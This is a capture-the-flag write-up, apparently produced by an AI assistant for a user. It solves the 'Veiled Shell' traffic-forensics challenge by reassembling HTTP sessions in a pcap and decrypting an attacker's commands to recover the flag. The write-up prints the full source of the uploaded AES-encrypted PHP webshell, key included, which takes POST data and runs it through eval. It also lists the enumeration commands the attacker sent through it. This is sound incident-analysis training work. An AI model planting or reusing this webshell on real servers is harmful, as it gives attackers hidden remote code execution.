# 玄机免费题解：2026安网杯-Veiled Shell

## 1. 本题信息与进度

- 平台：玄机（`https://xj.edisec.net`）
- 题目：`2026安网杯-Veiled Shell`
- 题目 ID：`580`
- 分类 / 难度 / 费用：MISC / 简单 / 免费（题目详情页明确显示“免费”）
- 题目简介：页面显示“暂无简介”；只有步骤 #1，需提交一个 Flag。
- 本题附件：`incident_traffic.pcap`
- 本记录的结论：已从 HTTP 流量中恢复 Flag；提交后以平台显示的完成状态为准。

此前的 `2026安网杯-像素囚笼1` 在充分尝试后仍没有得到有效 Flag。按用户要求，保留原记录并切换到这道免费简单题；前题记录见[像素囚笼1解题记录](C:/Users/mzj/Desktop/CTF/像素囚笼1-解题记录.md)。

## 2. 附件取得与校验

1. 在题目详情页确认题目是免费、简单，然后点击“下载附件”。
2. 在 `D:\Downloads` 找到新下载的 `Veiled+Shell附件 (2).zip`，大小 7,404 字节。目录中另有一个较早下载的 `(1)` 文件。
3. 对比两个 ZIP 的 SHA-256：均为 `402954C3AFE63A36482472141CEE24BDCE40C935F58AEE6F2986131C9523D23E`，所以内容相同。
4. 查看 ZIP 目录，仅有 `incident_traffic.pcap`：原始长度 23,394 字节，压缩长度 7,192 字节。
5. 将 PCAP 解压到 `C:\Users\mzj\Desktop\CTF\Veiled Shell-附件\incident_traffic.pcap`。解压后的 SHA-256 为 `BEB0179DB35C9BCAF71F4F08DB4FF8F6F740B6F5D182C0A55834F475061FECCF`。

使用的本机检查命令：

```powershell
Get-ChildItem -LiteralPath 'D:\Downloads' -File |
  Sort-Object LastWriteTime -Descending |
  Select-Object -First 12 Name,Length,LastWriteTime

$z = [IO.Compression.ZipFile]::OpenRead('D:\Downloads\Veiled+Shell附件 (2).zip')
try { $z.Entries | Select-Object FullName,Length,CompressedLength }
finally { $z.Dispose() }

$dst = 'C:\Users\mzj\Desktop\CTF\Veiled Shell-附件'
if (-not (Test-Path -LiteralPath $dst)) {
  New-Item -ItemType Directory -Path $dst | Out-Null
}
Expand-Archive -LiteralPath 'D:\Downloads\Veiled+Shell附件 (2).zip' `
  -DestinationPath $dst -Force

Get-FileHash -LiteralPath `
  'D:\Downloads\Veiled+Shell附件 (1).zip', `
  'D:\Downloads\Veiled+Shell附件 (2).zip', `
  'C:\Users\mzj\Desktop\CTF\Veiled Shell-附件\incident_traffic.pcap' `
  -Algorithm SHA256 | Format-List Path,Hash
```

## 3. 初步检查 PCAP

读取 PCAP 头后确认：经典 PCAP 2.4、小端序、Ethernet 链路类型、snaplen 65,535。逐条解析记录得到 **147 个包，全部为 TCP**。所有有效会话集中在 `172.28.0.20` 与 `172.28.0.10:80` 之间，HTTP Host 为 `www.corp.internal`，未看到 TLS。

这一结果说明重点应放在重组 TCP 会话并检查 HTTP 请求/响应，而不是寻找 DNS、附件或加密隧道。

## 4. 建立事件时间线

时间戳依据 PCAP 与 HTTP Date 字段。客户端是 `172.28.0.20`，Web 服务器是 `172.28.0.10:80`。

| 时间（服务器 HTTP Date） | 流量 / 观察 | 判断 |
|---|---|---|
| 02:25:25、02:25:27 | `GET /index.php`，均返回 200 | 正常页面访问/探测 |
| 02:25:28 | `GET /uploads/` 返回 403 | 目录浏览被禁止；但不能据此认为目录不可写或其中脚本不可访问 |
| 02:25:31 | `POST /index.php`，multipart 文件名 `shell.php`，类型 `application/x-php` | 上传了 PHP 文件，是关键异常行为 |
| 02:25:33、02:25:34 | `GET /` 与 `GET /index.php` | 上传后页面访问 |
| 02:25:36 起 | 多次 `POST /uploads/shell.php`，客户端为 Java 1.8.0_301 | 访问已上传的 PHP 脚本并发送加密命令 |

## 5. 还原上传的 PHP Shell

TCP 重组后，上传请求体包含如下 PHP 逻辑（去掉了 multipart 分隔符）：

```php
@error_reporting(0);
session_start();
$key = "3f9a7c2e1d8b6045";
$_SESSION['k'] = $key;
$post = file_get_contents("php://input");
if (!extension_loaded('openssl')) {
    $t = "base64_" . "decode";
    $post = $t($post . "");
    for ($i=0; $i<strlen($post); $i++) {
        $post[$i] = $post[$i] ^ $key[$i+1&15];
    }
} else {
    $post = openssl_decrypt($post, "AES128", $key);
}
$arr = explode('|', $post);
$func = $arr[0];
$params = $arr[1];
class C {
    public function __construct($k) { $this->k = $k; }
    public function __invoke($p) {
        ob_start();
        eval($p);
        $r = ob_get_clean();
        echo openssl_encrypt(base64_encode($r), "AES128", $this->k);
    }
}
@call_user_func(new C($key), $params);
```

判断依据：

1. 脚本从原始 HTTP 请求体读取数据；有 OpenSSL 时调用 `openssl_decrypt(..., "AES128", $key)`。
2. 密钥是 16 个 ASCII 字节：`3f9a7c2e1d8b6045`。未传 `options`，所以请求数据按 Base64 密文处理；`AES128` 默认对应 AES-128-CBC/PKCS#7。脚本没有显式传 IV；用 16 个零字节 IV 解密后得到合理 PHP 命令，且响应能按同一参数反向解密，验证了这个推断。
3. 解密明文以 `|` 分割，实际传给 `eval` 的是第二段。因此网络明文形如 `assert|system('id');`，被执行的是 `system('id');`。
4. 命令执行结果先 Base64 编码，再用同一 AES 参数加密回传。部分 HTTP 响应又被 gzip 压缩，因此还需先按响应头 gzip 解压，再做 AES 解密和 Base64 解码。

## 6. 解密命令及响应

从各 TCP 流重组出请求体后，依次 Base64 解码、AES-128-CBC 解密、PKCS#7 去填充，得到如下明文。服务端回包按 gzip（若响应头声明）、Base64、AES、Base64 的顺序还原：

| 客户端口 / 时间 | 解密出的请求明文 | 解密后的服务端输出 | 用途 |
|---|---|---|---|
| 35272 / 02:25:36 | `assert|system('id');` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` | 确认命令以 Web 服务用户运行 |
| 35274 / 02:25:38 | `assert|system('whoami');` | `www-data` | 与 `id` 输出相互印证 |
| 35282 / 02:25:40 | `assert|system('hostname');` | `web-prod-01` | 确认主机名 |
| 59568 / 02:25:42 | `assert|system('ls -la /var/www/html');` | `index.php` 与 `uploads/` | 确认站点目录结构 |
| 59580 / 02:25:45 | `assert|system('ls -la /var/www/html/uploads');` | `shell.php` | 确认上传文件已经落盘 |
| 59586 / 02:25:46 | `assert|system('ls /');` | 根目录列表中有 `flag.txt` | 定位目标文件 |
| 59594 / 02:25:49 | `assert|system('cat /flag.txt');` | `flag{bcb5e1538d12162510d5297a43fa8fcf}` | 直接取得 Flag |

Python 解密核心（本机已有 `cryptography`）：

```python
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7

key = b"3f9a7c2e1d8b6045"
iv = bytes(16)  # 对脚本未提供的 CBC IV 按零填充进行验证

def aes128_cbc_decrypt(base64_ciphertext: bytes) -> bytes:
    ciphertext = base64.b64decode(base64_ciphertext)
    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()

request_plaintext = aes128_cbc_decrypt(b"<从 HTTP 请求体取出的 Base64 密文>")
print(request_plaintext.decode())
```

解密最后一条请求先得到 `assert|system('cat /flag.txt');`。最后一条响应经过 gzip 解压后，是 Base64 格式的 AES 密文；先 AES 解密，再 Base64 解码，明文为 `flag{bcb5e1538d12162510d5297a43fa8fcf}\n`。

## 7. 解题结论

这是一次通过 HTTP 上传加密 PHP WebShell 的行为。攻击者从 `172.28.0.20` 向 `www.corp.internal` 上传 `shell.php`，随后通过加密请求控制 Web 服务器 `web-prod-01`。命令以 `www-data` 运行，逐步枚举 Web 目录和根目录，最后读取 `/flag.txt`。Flag 的来源是抓包中的加密命令回包解密结果，不是猜测或从平台外部查找。

**待平台验证的 Flag：**

```text
flag{bcb5e1538d12162510d5297a43fa8fcf}
```

## 8. 平台提交与验证

按用户此前的要求，我已在玄机该题的提交框中提交上述 Flag。平台明确返回“FLAG 正确~，恭喜你完成此挑战~”，题目页顶部显示“已完成”，步骤进度从 `0/1` 更新为 `1/1`。因此本题已通过平台验证。

## 9. 记录范围与可复核文件

- 附件：`C:\Users\mzj\Desktop\CTF\Veiled Shell-附件\incident_traffic.pcap`
- 本指南：`C:\Users\mzj\Desktop\CTF\Veiled Shell-解题记录.md`
- 上一题未解记录：`C:\Users\mzj\Desktop\CTF\像素囚笼1-解题记录.md`
- 本文中的命令、会话时间线、解密明文和命令输出均来自本次附件检查；平台完成状态已按第 8 节现场核实。
